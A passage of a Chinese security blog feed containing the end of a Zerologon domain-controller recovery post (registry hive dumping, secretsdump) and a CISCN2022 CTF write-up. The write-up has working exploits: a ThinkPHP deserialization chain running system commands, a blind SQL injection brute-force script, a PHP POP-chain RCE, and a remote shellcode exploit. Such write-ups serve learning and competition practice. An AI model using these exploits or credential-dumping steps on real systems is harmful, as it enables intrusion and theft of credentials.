alt="image-20220713230637115"></p><p>成功连接</p><p><strong>恢复域控原始hash</strong></p><pre><code class="shell">reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.savelget system.savelget sam.savelget security.save</code></pre><p><strong>删除文件</strong></p><pre><code class="shell">del /f system.savedel /f sam.savedel /f security.save</code></pre><p><strong>通过 sam.save、security.save、system.save 这些⽂件获得原来域控机器上的 Ntlm Hash 值，⽤于恢复密码</strong></p><pre><code class="shell">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713234613032.png" alt="image-20220713234613032"></p><p><strong>通过拿到 $MACHINE.ACC: 的值，然后进⾏恢复</strong></p><p>脚本下载：<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><p>使用方法:python reinstall_original_pw.py 域控机器名 域控ip $MACHINE.ACC后半部分的值</p><pre><code class="shell">python3 reinstall_original_pw.py ly-1 192.168.64.150 d6b706f6a4ea457327a4bfc1c4c642cb</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235319943.png" alt="image-20220713235319943"></p><p><strong>测试是否恢复成功</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235714975.png" alt="image-20220713235714975"></p><p>此时使用空密码去获取域内的所有用户的凭证已经不行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;内网安全第一章&quot;&gt;&lt;a href=&quot;#内网安全第一章&quot; class=&quot;headerlink&quot; title=&quot;内网安全第一章&quot;&gt;&lt;/a&gt;内网安全第一章&lt;/h1&gt;&lt;h2 id=&quot;内网基础知识&quot;&gt;&lt;a href=&quot;#内网基础知识&quot; class=</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2022</title>
    <link href="https://sakurahack-y.github.io/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/"/>
    <id>https://sakurahack-y.github.io/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/</id>
    <published>2022-06-20T15:35:31.000Z</published>
    <updated>2022-07-06T07:08:16.343Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到:"></a>签到:</h2><p>根据公众号给的提示，可构造出脚本</p><pre><code>a=&#39;5543053560369047024142002765898038342775948119489181360354534575324142175929505171739721800870791249314864251567972295612874802183218042622056229755674962381242884261754543945970151712920835729189983000341612995263262927255805323073625456260457938936828798227686401899839962031005363203251056213941366146686875718432385301325733733171999005964405664494560905422663352160064965067318132130228461655121372448333527884088007285116323305598946651171485490621766011242810388503390388653399069240050404600114824579296172741241184113479&#39;a=a[0:28]tmp=&#39;0&#39;b=&#39;1732251413440356045166710055&#39;for i in range(28):    print((ord(a[i])+ord(b[i])-2*ord(tmp[0]))%10,end=&quot;&quot;)</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121548778.png" alt="image-20220529121548778"></p><p>访问url:</p><p>xxx/send?msg=s</p><p>再访问</p><p>xxx/send?msg=6275204973709393069208712710</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121645372.png" alt="image-20220529121645372"></p><h2 id="基于挑战码的双向认证1"><a href="#基于挑战码的双向认证1" class="headerlink" title="基于挑战码的双向认证1"></a>基于挑战码的双向认证1</h2><h2 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h2><p>非预期解:</p><p>连接ssh</p><p>进入</p><p>/root/cube-shell/instance/flag_server 目录</p><p>两个flag全在里面</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529124444190.png" alt="image-20220529124444190"></p><h2 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h2><p>非预期</p><p>连接ssh</p><p>进入</p><p>/root/cube-shell/instance/flag_server 目录</p><p>su root</p><p>弱口令密码:toor</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529142614152.png" alt="image-20220529142614152"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>直接填问卷即可得到flag</p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><pre><code>tshark -T json -r ez_usb.pcapng &gt; data.json</code></pre><p>导出json数据</p><p>经过分析，它是有两个键盘流量。</p><p>分离一下</p><pre><code>import jsonjsonData=&quot;&quot;with open(&quot;data.json&quot;) as f:    text=f.read()    jsonData=json.loads(text)data_1=&quot;&quot;data_2=&quot;&quot;for i in jsonData:    try:        if i[&quot;_source&quot;][&quot;layers&quot;][&quot;usb&quot;][&quot;usb.src&quot;]==&quot;2.8.1&quot;:            data_1+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;        else:            data_2+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;    except:        passprint(data_1)print(data_2)</code></pre><p>分别保存为1.txt,2.txt</p><p>使用网上现成得脚本进行提取数据</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;1.txt&#39;) //2.txtfor line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529144605125.png" alt="image-20220529144605125"></p><p>发现是一个压缩包，第二个为密码</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145500226.png" alt="image-20220529145500226"></p><p>解开即可得到flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145515024.png" alt="image-20220529145515024"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>使用的</p><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p><p>exp:</p><pre><code class="php">&lt;?phpnamespace think&#123;    abstract class Model&#123;        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        function __construct($obj = &#39;&#39;)&#123;            $this-&gt;lazySave = True;            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;cat /flag.txt&#39;]];            $this-&gt;exists = True;            $this-&gt;table = $obj;            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];            $this-&gt;jsonAssoc = True;        &#125;    &#125;&#125;namespace think\model&#123;    use think\Model;    class Pivot extends Model&#123;    &#125;&#125;namespace&#123;    echo(urlencode((serialize(new think\model\Pivot(new think\model\Pivot())))));&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173238834.png" alt="image-20220529173238834"></p><p>ls / 查看</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173416181.png" alt="image-20220529173416181"></p><p>读flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529111702941.png" alt="image-20220529111702941"></p><h2 id="ezpentest"><a href="#ezpentest" class="headerlink" title="ezpentest"></a>ezpentest</h2><p>waf脚本如下:</p><pre><code class="php">&lt;?phpfunction safe($a) &#123;    $r = preg_replace(&#39;/[\s,()#;*~\-]/&#39;,&#39;&#39;,$a);    $r = preg_replace(&#39;/^.*(?=union|binary|regexp|rlike).*$/i&#39;,&#39;&#39;,$r);    return (string)$r;  &#125;?&gt;</code></pre><p>在比赛中是没有给出代码的</p><p>考察sql注入，和2022虎符babysql很相似。</p><p>可利用case when注入，可构造出payload</p><pre><code>0&#39;||case&#39;1&#39;when`password`collate&#39;utf8mb4_bin&#39;like&#39;&#123;&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;</code></pre><p>过滤了取反导致不能利用<del>0+1来制造溢出,但是我们可以利用 18446744073709551615+1(它就代表</del>0+1)来制造出溢出，当匹配到正确字符时，服务器会报500，否则就返回’0’，服务器会报error。或者用9223372036854775807+1也行</p><p>由此可构造出脚本:</p><pre><code class="python">import requestsimport stringurl = &#39;http://1.14.71.254:28470/login.php&#39;result = &#39;&#39;ceshi = &#39;&#39;lis = string.ascii_letters + string.digits + &quot;^!%@_$%*&quot;gl = &quot;%*()_&quot;while 1:    for i in lis:            if i in gl:  # 这里是对like正则匹配中的一些特殊符号进行转义                i = &quot;\\&quot; + i            ceshi = result + i            payload = &quot;0&#39;||case&#39;1&#39;when`username`collate&#39;utf8mb4_bin&#39;like&#39;&#123;0&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;&quot;.format(ceshi)            #print(payload)            #username 改为 password即可得到密码            data = &#123;                &quot;username&quot;: &quot;666&quot;,                &quot;password&quot;: payload            &#125;            response = requests.post(url, data=data)            if response.status_code == 500:                print(&quot;success!&quot;)                result = result + i                res2 = result                print(res2.replace(&quot;\\&quot;,&quot;&quot;))                break            elif response.status_code == 0:                continue            else:                continue</code></pre><p>可得到账号密码:</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/7%25@@JT7XEDZVT%5DEG%7D%7BJWNSG.png" alt="img"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010207219.png" alt="image-20220604010207219"></p><pre><code>nssctfwabbybaboo!@$%!!PAssw40d_Y0u3_Never_Konwn!@!!</code></pre><p>进去后得到一串乱码文件</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010331417.png" alt="image-20220604010331417"></p><p>查看源代码</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010813177.png" alt="image-20220604010813177"></p><p>发现是phpjiami加密</p><p>github有相应的工具:<a href="https://github.com/wenshui2008/phpjiami_decode">https://github.com/wenshui2008/phpjiami_decode</a></p><p>但是如果直接复制粘贴下来解密大部分情况都会漏字符，而phpjiami这里解密相对比较苛刻，少一个字符都会解密失败，可以采用脚本把混淆代码保存下来再解密，把url和cookie改成你的就可以了</p><pre><code class="php">&lt;?php$url =&quot;http://1.14.71.254:28470/login.php&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_COOKIE, &quot;_ga=GA1.1.1492528755.1648872076; session=6fdc00cf-2ec3-4924-b99b-b474ac227c2d; PHPSESSID=cbdac7b296d255ad4c2c69066c4356ec&quot;);$result = curl_exec($ch);curl_close($ch);echo urlencode($result);file_put_contents(&quot;pop.php&quot;,$result);?&gt;</code></pre><p>将生成的文件放入解密脚本</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604013234468.png" alt="image-20220604013234468"></p><p>最终得到一下代码</p><pre><code class="php">&lt;?phpsession_start();if(!isset($_SESSION[&#39;login&#39;]))&#123;    die();&#125;function Al($classname)&#123;    include $classname.&quot;.php&quot;;&#125;if(isset($_REQUEST[&#39;a&#39;]))&#123;    $c = $_REQUEST[&#39;a&#39;];    $o = unserialize($c);    if($o === false) &#123;        die(&quot;Error Format&quot;);    &#125;else&#123;        spl_autoload_register(&#39;Al&#39;);        $o = unserialize($c);        $raw = serialize($o);        if(preg_match(&quot;/Some/i&quot;,$raw))&#123;            throw new Error(&quot;Error&quot;);        &#125;        $o = unserialize($raw);        var_dump($o);    &#125;&#125;else &#123;    echo file_get_contents(&quot;SomeClass.php&quot;);&#125;</code></pre><p>访问:</p><pre><code>view-source:http://1.14.71.254:28470/1Nd3x_Y0u_N3v3R_Kn0W.php</code></pre><p>可得到someclass的代码</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;?&gt;</code></pre><p>构造pop链，进行反序列化</p><p><strong>spl_autoload_register的作用就是把后面反序列化不存在的类所在的文件加载进来</strong></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604015509088.png" alt="image-20220604015509088"></p><p>由于漏洞代码在SomeClass.php中，所以我们必须包含这个文件。</p><p>这里存在一个过滤</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170012434.png" alt="image-20220604170012434"></p><p>我们需要让它包含后直接进入destruct魔术函数</p><p>关于gc回收机制可参考这篇文章，写的非常好:<a href="https://blog.csdn.net/qq_51295677/article/details/123520193">https://blog.csdn.net/qq_51295677/article/details/123520193</a></p><p>pop链条的思路非常清晰：</p><pre><code>E的destruct --&gt; B 的toString --&gt; A(rce点)</code></pre><p>最终exp:</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;class SomeClass&#123;    public $a;&#125;$a = new A();$b = new B();$e = new E();$e -&gt;a = $b; #die函数会把$b当作字符串输出，从而调用了toString魔术方法$b -&gt;a = $a;$arr = new ArrayObject(); #只要是php的原生类即可$arr -&gt; a = &quot;system&quot;;$arr -&gt; b = &quot;ls /&quot;;$a -&gt;b = $arr;$c = new SomeClass();$c -&gt;a =$e;echo(urlencode(str_replace(&quot;i:1&quot;,&quot;i:0&quot;,serialize(array($c,1)))))?&gt;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604165811456.png" alt="image-20220604165811456"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170425296.png" alt="image-20220604170425296"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>case1,确保unk_202028和unk_202024为1，</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174222620.png" alt="image-20220529174222620"></p><p>case2:，unk_202028和unk_202028为1的时候执行写的shellcode，shellcode必须为可见字符：</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174438381.png" alt="image-20220529174438381"></p><p>生成shellcode可见字符串：</p><p><a href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140033280.png" alt="image-20220529140033280"></p><p>exp：</p><pre><code class="python">from pwn import*context.log_level = &quot;debug&quot;io = remote(&quot;123.56.111.202&quot;,17395)# io = process(&quot;./login&quot;)io.recv()shellcode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;payload = &quot;opt:1\n&quot; + &quot;msg:ro0t1\n&quot;io.sendline(payload)payload = &quot;opt:2\n&quot; + &quot;msg:&quot; + shellcode + &quot;\n&quot;io.sendline(payload)io.interactive()</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140131706.png" alt="image-20220529140131706"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>swift的AST树</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201512778.png" alt="image-20220529201512778"></p><p>参照swiftc的输出</p><p>构造出脚本</p><pre><code class="c">#include &lt;stdio.h&gt;unsigned char b[] = &#123;88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16&#125;;unsigned char k[] = &quot;345y&quot;;int main()&#123;    for (int i = 0; i &lt; 42 - 3; i++)    &#123;        unsigned char tmp = k[0];        k[0] = k[1];        k[1] = k[2];        k[2] = k[3];        k[3] = tmp;    &#125;    for (int i = 42 - 4; i &gt;= 0; i--)    &#123;        unsigned char r0 = b[i + 0], r1 = b[i + 1], r2 = b[i + 2], r3 = b[i + 3];        unsigned char tmp = k[3];        k[3] = k[2];        k[2] = k[1];        k[1] = k[0];        k[0] = tmp;        b[i + 0] = r2 ^ k[2];        b[i + 1] = r3 ^ k[3];        b[i + 2] = ((k[0] + (b[i + 0] &gt;&gt; 4)) &amp; 0xff) ^ r0;        b[i + 3] = ((k[1] + (b[i + 1] &gt;&gt; 2)) &amp; 0xff) ^ r1;    &#125;    for (int i = 0; i &lt; 42; i++)    &#123;        printf(&quot;%c&quot;, b[i]);    &#125;    return 0;&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201614424.png" alt="image-20220529201614424"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a href=&quot;#crypto&quot; class=&quot;headerlink&quot; title=&quot;crypto&quot;&gt;&lt;/a&gt;crypto&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ciscn" scheme="https://sakurahack-y.github.io/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>web随缘刷</title>
    <link href="https://sakurahack-y.github.io/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/"/>
    <id>https://sakurahack-y.github.io/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/</id>
    <published>2022-05-19T04:22:18.000Z</published>
    <updated>2022-06-27T02:33:28.870Z</updated>
    
    <content type="html"><![CDATA[<p>唉，ciscn快开了，ctf太卷了，做做以前题练一下手吧</p><p>[TOC]</p><h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><p>源码:</p><pre><code class="php">&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123;    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) &#123;        die(&quot;这么大个的东西你是想d我吗？&quot;);    &#125;    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);    if ($imageinfo === FALSE) &#123;        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);    &#125;    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;        die(&quot;东西不能方方正正的话就很讨厌&quot;);    &#125;    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || 